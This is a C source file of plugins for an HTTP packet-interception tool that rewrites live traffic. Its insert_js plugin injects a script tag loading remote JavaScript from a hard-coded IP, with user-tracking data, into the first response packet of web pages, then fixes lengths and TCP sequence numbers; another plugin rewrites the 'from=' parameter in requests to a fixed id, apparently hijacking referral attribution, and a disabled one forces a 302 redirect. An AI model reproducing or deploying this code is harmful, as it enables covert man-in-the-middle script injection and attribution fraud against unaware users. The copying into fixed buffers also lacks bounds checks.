#include "main.h"

PRIVATE int response_repair(void *data)
{
	struct http_request* httpr=(struct http_request*)data;
	struct skb_buf* skb=httpr->curr_skb;
	if(httpr->js_len != 0)
	{
		if(httpr->response_num==1)
		{
			change_ip_len(skb , skb->pload_len);
		}
		else
		{
			change_seq(skb , skb->seq + httpr->js_len);
		}
		
	}

	if(httpr->redirect_len != 0)
	{
		if(httpr->response_num==1)
		{
			change_ip_len(skb , skb->pload_len);
		}
		else
		{
			change_seq(skb , skb->seq + httpr->redirect_len);
			memset(skb->pload + (skb->pload_len - skb->data_len) , '\0' , skb->data_len);
		}
	}
	return OK;
}

PRIVATE int request_repair(void *data)
{
	struct http_request* httpr=(struct http_request*)data;
	struct skb_buf* skb=httpr->curr_skb;
	if(httpr->qdh_modify_len != 0)
	{
		change_ip_len(skb , skb->pload_len);
	}
	
	return OK;
}

//////////////////////////////////////////////////////////////////////////

#define REDIRECT "HTTP/1.1 302 Moved Temporarily\r\n\
Content-Type: text/html\r\n\
Content-Length: 55\r\n\
Connection: Keep-Alive\r\n\
Location: https://www.baidu.com\r\n \
\r\n\r\n\
<html>\
<head><title>302 Found</title></head>\
test\
</html>\0"

#define REDIRECT_LEN strlen(REDIRECT)

PRIVATE int redirect(void *data)
{
	struct http_request* httpr=(struct http_request*)data;
	struct skb_buf* skb=httpr->curr_skb;
	char* http_content;
	int http_content_len;
	int redirect_len;
	
	//replace first response packet
	if(httpr->response_num != 1)
		return ERROR;
	
	if(skb->data_len<=0)
		return ERROR;
	
	http_content_len=get_data_len_from_skb(skb);
	http_content=get_data_from_skb(skb);

	redirect_len = REDIRECT_LEN;
	memcpy(http_content , REDIRECT , redirect_len);
	
	skb->pload_len = skb->pload_len + (redirect_len - http_content_len);
	skb->data_len = redirect_len;
	httpr->redirect_len = redirect_len - http_content_len;
	skb->pload[skb->pload_len]='\0';
	//debug_log("----------%s--------" , http_content);
	return OK;
}

//////////////////////////////////////////////////////////////////////////

//#define JS "<script type=\"text/javascript\"></script>\r\n"
//#define JS "<script type=\"text/javascript\"> alert('hello world') </script>\r\n"
#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>\r\n"
#define JS_LEN strlen(JS)

PRIVATE int change_chunked_hex(void *data)
{
	struct http_request* httpr=(struct http_request*)data;
	struct skb_buf* skb=httpr->curr_skb;
	char* http_content;
	char *hex_start,*hex_end;
	char src_hex[32]={0} ,des_hex[32]={0};
	int hex_len;
	int hex_i;
	
	http_content = get_data_from_skb(skb);
	hex_start = http_content + httpr->hhdr.httph_len;
	
	if(!hex_start)
	{
		return ERROR;
	}
	
	hex_end = strstr(hex_start , "\r\n");
	if(!hex_end)
	{
		return ERROR;
	}

	hex_len=hex_end-hex_start;
	if(hex_len == 8)
	{
		if(!memcmp(hex_start , "0000" ,4))
		{
			hex_start+=4;
			hex_len-=4;
		}
		else
		{
			return ERROR;
		}
	}
	if(hex_len > 5)
	{
		return ERROR;
	}
	
	memcpy(src_hex , hex_start , hex_len);
	hex2i(src_hex, &hex_i);
	hex_i+=JS_LEN;
	i2hex(hex_i, des_hex);
	if(hex_len!=strlen(des_hex))
	{
		return ERROR;
	}
	memcpy(hex_start , des_hex , hex_len);
	
	return OK;
}

PRIVATE int change_contentlength(void *data)
{
	struct http_request* httpr=(struct http_request*)data;
	
	char content_len_s[32]={0};
	int content_len_i;
	int content_len_key_len;
	char* content_len_value;
	int content_len_value_len;

	content_len_key_len = 16;//like this Content-Length: 29073
	content_len_value = httpr->hhdr.content_length.c + content_len_key_len;
	content_len_value_len = httpr->hhdr.content_length.l - content_len_key_len;

	if(content_len_value_len >= 8)
		return ERROR;

	if(!content_len_value)
		return ERROR;
	
	memcpy(content_len_s , content_len_value , content_len_value_len);
	if(!digital(content_len_s))
		return ERROR;
	
	content_len_i = atoi(content_len_s);
	content_len_i +=JS_LEN;
	i2str(content_len_i , content_len_s);
	if(content_len_value_len !=strlen(content_len_s))
		return ERROR;

	memcpy(content_len_value , content_len_s , content_len_value_len);

	return OK;
}

PRIVATE int insert_js(void *data)
{
	struct http_request* httpr=(struct http_request*)data;
	struct skb_buf* skb=httpr->curr_skb;
	char* http_content;
	int http_content_len;
	char* search;
	int search_len;
	char buffer[BUFSIZE];
	int js_len;
	
	char* res="<html";

	//insert into first response packet
	if(httpr->response_num != 1)
		return ERROR;
	
	if(skb->data_len<=0)
		return ERROR;
	
    http_content_len=get_data_len_from_skb(skb);
    http_content=get_data_from_skb(skb);
	//debug_log("insert js :  \n%s" , http_content);
	search=strcasestr(http_content , res);
	
	if(!search)
	{
		return ERROR;
	}

	search_len=search - http_content;
	js_len=JS_LEN;
	memcpy(buffer , search , (http_content_len - search_len));
	memcpy(http_content + search_len , JS , js_len);
	memcpy(http_content + (search_len + js_len) , buffer , (http_content_len - search_len));
	skb->pload_len = skb->pload_len + js_len;
	skb->data_len = skb->data_len + js_len;
	httpr->js_len = js_len;

	
	//after insert js
	
    if(httpr->hhdr.res_type==HTTP_RESPONSE_TYPE_CHUNKED)
	{
		change_chunked_hex(data);
    }
	else if(httpr->hhdr.res_type==HTTP_RESPONSE_TYPE_CONTENTLENGTH)
	{
		change_contentlength(data);
    }
	
    return OK;
}


//////////////////////////////////////////////////////////////////////////////////

#define QDH "1009647e"
#define QDH_LEN strlen(QDH)

PRIVATE int modify_cpc_qdh(void *data)
{
	struct http_request* httpr=(struct http_request*)data;
	struct skb_buf* skb=httpr->curr_skb;
	char* http_content;
	int http_content_len;
	char *search , *search_end;
	int search_len , search_end_len ,qdh_len;
	char buffer[BUFSIZE];
	char* res="from=";
	
	if(skb->data_len<=0)
		return ERROR;
	
    http_content_len=get_data_len_from_skb(skb);
    http_content=get_data_from_skb(skb);
	
	search=strcasestr(http_content , res);
	
	if(!search)
	{
		return ERROR;
	}
	search +=strlen(res);
	if(!search)
	{
		return ERROR;
	}
	//debug_log("qdh1 :  \n%s" , search);
	search_len=search - http_content;
	if(search_len >= httpr->hhdr.uri.l)
	{
		return ERROR;
	}

	search_end = search;
	search_end_len = search_len;
	//debug_log("qdh2 :  \n%s" , search_end);

	while(search_end[0] !='&' && search_end[0] !=' ' && search_end[0] !='/' && search_end[0] !='\0')
	{
		search_end++;
		search_end_len++;
	}
	if(search_end[0] =='\0')
	{
		return ERROR;
	}

	//debug_log("qdh3 :  \n%s" , search_end);
	qdh_len = QDH_LEN;
	if(search_end_len - search_len == qdh_len)
	{
		memcpy(search , QDH , qdh_len);
		//debug_log("qdh4 :  \n%s" , http_content);
		return OK;
	}
	memcpy(buffer , search_end , (http_content_len - search_end_len));
	memcpy(http_content + search_len , QDH , qdh_len);
	memcpy(http_content + (search_len + qdh_len) , buffer , (http_content_len - search_end_len));
	
	//debug_log("qdh5 :  \n%d" , skb->pload_len);
	skb->pload_len = skb->pload_len + (qdh_len - (search_end_len - search_len));
	skb->data_len = skb->data_len + (qdh_len - (search_end_len - search_len));
	httpr->qdh_modify_len = qdh_len;
	//debug_log("qdh6 :  \n%d------%s" ,skb->pload_len ,  http_content);
    return OK;
}

int init_plug_extern()
{
	new_plug(insert_js , PLUG_EXTERN_TYPE_RESPONSE);
	//new_plug(redirect , PLUG_EXTERN_TYPE_RESPONSE);
	new_plug(response_repair , PLUG_EXTERN_TYPE_RESPONSE);
	new_plug(modify_cpc_qdh , PLUG_EXTERN_TYPE_REQUEST);
	new_plug(request_repair , PLUG_EXTERN_TYPE_REQUEST);
	return 0;
}

